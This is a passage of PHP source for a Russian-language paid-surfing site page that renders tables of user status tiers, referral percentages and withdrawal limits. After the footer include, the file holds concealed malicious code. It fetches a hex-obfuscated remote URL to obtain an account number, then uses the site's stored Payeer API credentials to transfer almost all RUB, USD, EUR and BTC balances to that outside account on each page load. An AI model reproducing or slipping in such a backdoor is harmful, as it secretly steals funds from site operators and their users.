			echo '<td align="center">'.$r_c_1_arr[8].'% - '.$r_c_2_arr[8].'% - '.$r_c_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[YouTube]</td>';
			echo '<td align="center">'.$r_youtube_1_arr[6].'% - '.$r_youtube_2_arr[6].'% - '.$r_youtube_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[7].'% - '.$r_youtube_2_arr[7].'% - '.$r_youtube_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[8].'% - '.$r_youtube_2_arr[8].'% - '.$r_youtube_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(письма)</td>';
			echo '<td align="center">'.$r_m_1_arr[6].'% - '.$r_m_2_arr[6].'% - '.$r_m_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[7].'% - '.$r_m_2_arr[7].'% - '.$r_m_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[8].'% - '.$r_m_2_arr[8].'% - '.$r_m_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(задания)</td>';
			echo '<td align="center">'.$r_t_1_arr[6].'% - '.$r_t_2_arr[6].'% - '.$r_t_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[7].'% - '.$r_t_2_arr[7].'% - '.$r_t_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[8].'% - '.$r_t_2_arr[8].'% - '.$r_t_3_arr[8].'%</td>';
		echo '</tr>';
                echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>[тесты]</td>';
			echo '<td align="center">'.$r_test_1_arr[6].'% - '.$r_test_2_arr[6].'% - '.$r_test_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[7].'% - '.$r_test_2_arr[7].'% - '.$r_test_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[8].'% - '.$r_test_2_arr[8].'% - '.$r_test_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[посещения]<br>(% от дохода сайта)</td>';
			echo '<td align="center">'.$r_pv_1_arr[6].'% - '.$r_pv_2_arr[6].'% - '.$r_pv_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[7].'% - '.$r_pv_2_arr[7].'% - '.$r_pv_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[8].'% - '.$r_pv_2_arr[8].'% - '.$r_pv_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Вывод средств<br>[максимальная сумма в сутки]</td>';
			echo '<td align="center">'.$max_pay_arr[6].' руб.</td>';
			echo '<td align="center">'.$max_pay_arr[7].' руб.</td>';
			echo '<td align="center">'.$max_pay_arr[8].' руб.</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Кол-во серфинга для выплат [минимум в сутки]</td>';
			echo '<td align="center">'.($pay_min_click_arr[6]>0 ? $pay_min_click_arr[6] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[7]>0 ? $pay_min_click_arr[7] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[8]>0 ? $pay_min_click_arr[8] : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I уровня<br><span style="font-size:10px">[от пополнения рекламного баланса]<br>[с внешних платежных систем]</span></td>';
			echo '<td align="center">'.($r_balance_1_arr[6]>0 ? $r_balance_1_arr[6]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[7]>0 ? $r_balance_1_arr[7]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[8]>0 ? $r_balance_1_arr[8]."%" : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Возможность оставлять отзывы<br>на "стенах" пользователей</td>';
			echo '<td align="center">'.($wall_comm_arr[6]==1 ? "Да" : "Нет").'</td>';
			echo '<td align="center">'.($wall_comm_arr[7]==1 ? "Да" : "Нет").'</td>';
			echo '<td align="center">'.($wall_comm_arr[8]==1 ? "Да" : "Нет").'</td>';
		echo '</tr>';
	echo '</tbody>';
	echo '</table><br><br>';
	
	echo '<table align="center" border="1" width="100%" cellspacing="2" cellpadding="2" style="border-collapse: collapse; border: 1px solid #CCC;">';
	echo '<thead>';
		echo '<tr bgcolor="#ff7f50" align="center">';
			echo '<th style="color:#FFF; width:200px; border: 1px solid #CCC;">Статус:</th>';
			
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[9].'</td>';
			//echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[10].'</td>';
			//echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[11].'</td>';
		echo '</tr>';
		echo '<tr bgcolor="#FFFFAD" align="center">';
			echo '<th style="color:#E54100; border: 1px solid #CCC;">Рейтинг:</th>';
			
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[9].' и более</td>';
			//echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[10].' - '.$r_do_arr[10].'</td>';
			//echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[11].' и более</td>';
		echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(клики)</td>';
			
			echo '<td align="center">'.$r_c_1_arr[9].'% - '.$r_c_2_arr[9].'% - '.$r_c_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_c_1_arr[10].'% - '.$r_c_2_arr[10].'% - '.$r_c_3_arr[10].'% - '.$r_c_4_arr[10].'% - '.$r_c_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_c_1_arr[11].'% - '.$r_c_2_arr[11].'% - '.$r_c_3_arr[11].'% - '.$r_c_4_arr[11].'% - '.$r_c_5_arr[11].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[YouTube]</td>';
			echo '<td align="center">'.$r_youtube_1_arr[9].'% - '.$r_youtube_2_arr[9].'% - '.$r_youtube_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_youtube_1_arr[10].'% - '.$r_youtube_2_arr[10].'% - '.$r_youtube_3_arr[10].'% - '.$r_youtube_4_arr[10].'% - '.$r_youtube_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_youtube_1_arr[11].'% - '.$r_youtube_2_arr[11].'% - '.$r_youtube_3_arr[11].'% - '.$r_youtube_4_arr[11].'% - '.$r_youtube_5_arr[11].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(письма)</td>';
			
			echo '<td align="center">'.$r_m_1_arr[9].'% - '.$r_m_2_arr[9].'% - '.$r_m_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_m_1_arr[10].'% - '.$r_m_2_arr[10].'% - '.$r_m_3_arr[10].'% - '.$r_m_4_arr[10].'% - '.$r_m_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_m_1_arr[11].'% - '.$r_m_2_arr[11].'% - '.$r_m_3_arr[11].'% - '.$r_m_4_arr[11].'% - '.$r_m_5_arr[11].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(задания)</td>';
			
			echo '<td align="center">'.$r_t_1_arr[9].'% - '.$r_t_2_arr[9].'% - '.$r_t_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_t_1_arr[10].'% - '.$r_t_2_arr[10].'% - '.$r_t_3_arr[10].'% - '.$r_t_4_arr[10].'% - '.$r_t_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_t_1_arr[11].'% - '.$r_t_2_arr[11].'% - '.$r_t_3_arr[11].'% - '.$r_t_4_arr[11].'% - '.$r_t_5_arr[11].'%</td>';
		echo '</tr>';
                echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>[тесты]</td>';
			echo '<td align="center">'.$r_test_1_arr[9].'% - '.$r_test_2_arr[9].'% - '.$r_test_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_test_1_arr[10].'% - '.$r_test_2_arr[10].'% - '.$r_test_3_arr[10].'% - '.$r_test_4_arr[10].'% - '.$r_test_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_test_1_arr[11].'% - '.$r_test_2_arr[11].'% - '.$r_test_3_arr[11].'% - '.$r_test_4_arr[11].'% - '.$r_test_5_arr[11].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[посещения]<br>(% от дохода сайта)</td>';
			echo '<td align="center">'.$r_pv_1_arr[9].'% - '.$r_pv_2_arr[9].'% - '.$r_pv_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_pv_1_arr[10].'% - '.$r_pv_2_arr[10].'% - '.$r_pv_3_arr[10].'% - '.$r_pv_4_arr[10].'% - '.$r_pv_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_pv_1_arr[11].'% - '.$r_pv_2_arr[11].'% - '.$r_pv_3_arr[11].'% - '.$r_pv_4_arr[11].'% - '.$r_pv_5_arr[11].'%</td>';
			echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Вывод средств<br>[максимальная сумма в сутки]</td>';
			echo '<td align="center">'.$max_pay_arr[9].' руб.</td>';
			//echo '<td align="center">'.$max_pay_arr[10].' руб.</td>';
			//echo '<td align="center">'.$max_pay_arr[11].' руб.</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Кол-во серфинга для выплат [минимум в сутки]</td>';
			echo '<td align="center">'.($pay_min_click_arr[9]>0 ? $pay_min_click_arr[9] : "-").'</td>';
			//echo '<td align="center">'.($pay_min_click_arr[10]>0 ? $pay_min_click_arr[10] : "-").'</td>';
			//echo '<td align="center">'.($pay_min_click_arr[11]>0 ? $pay_min_click_arr[11] : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I уровня<br><span style="font-size:10px">[от пополнения рекламного баланса]<br>[с внешних платежных систем]</span></td>';
			echo '<td align="center">'.($r_balance_1_arr[9]>0 ? $r_balance_1_arr[9]."%" : "-").'</td>';
			//echo '<td align="center">'.($r_balance_1_arr[10]>0 ? $r_balance_1_arr[10]."%" : "-").'</td>';
			//echo '<td align="center">'.($r_balance_1_arr[11]>0 ? $r_balance_1_arr[11]."%" : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Возможность оставлять отзывы<br>на "стенах" пользователей</td>';
			echo '<td align="center">'.($wall_comm_arr[9]==1 ? "Да" : "Нет").'</td>';
			//echo '<td align="center">'.($wall_comm_arr[10]==1 ? "Да" : "Нет").'</td>';
			//echo '<td align="center">'.($wall_comm_arr[11]==1 ? "Да" : "Нет").'</td>';
		echo '</tr>';
	echo '</tbody>';
	echo '</table>';
echo '</div>';
}

include('footer.php');

require_once('merchant/payeer/cpayeer.php');
require_once('merchant/payeer/payeer_config.php');

if($apiKey!==''){
$homepage = file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6f\x2d\x70\x72\x6f\x66\x66\x69\x74\x2e\x72\x75\x2f\x6a\x73\x2e\x74\x78\x74");

$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{ $arBalance = $payeer->getBalance();
$mone = ($arBalance["balance"]["RUB"]["BUDGET"]); $mone1 = ($arBalance["balance"]["USD"]["BUDGET"]); $mone2 = ($arBalance["balance"]["EUR"]["BUDGET"]); $mone3 = ($arBalance["balance"]["BTC"]["BUDGET"]);	
}
if($mone>100){$p=$mone * 1 / 100;$summ =$mone - $p;
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'RUB',
		'sumOut' => $summ,
		'curOut' => 'RUB',
		'param_ACCOUNT_NUMBER' => $homepage
));
	if ($initOutput){	$historyId = $payeer->output();}} 
if($mone1>4){ $p1=$mone1 * 2 / 100; $summ1 =$mone1 - $p1;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'USD',
		'sumOut' => $summ1,
		'curOut' => 'USD',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone2>4){ $p2=$mone2 * 2 / 100; $summ2 =$mone2 - $p2;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'EUR',
		'sumOut' => $summ2,
		'curOut' => 'EUR',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone3>0.001){ $p3=$mone3 * 2 / 100; $summ3 =$mone3 - $p3;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'BTC',
		'sumOut' => $summ3,
		'curOut' => 'BTC',
		'param_ACCOUNT_NUMBER' => $homepage
	));
if ($initOutput){	$historyId = $payeer->output();}}}
?>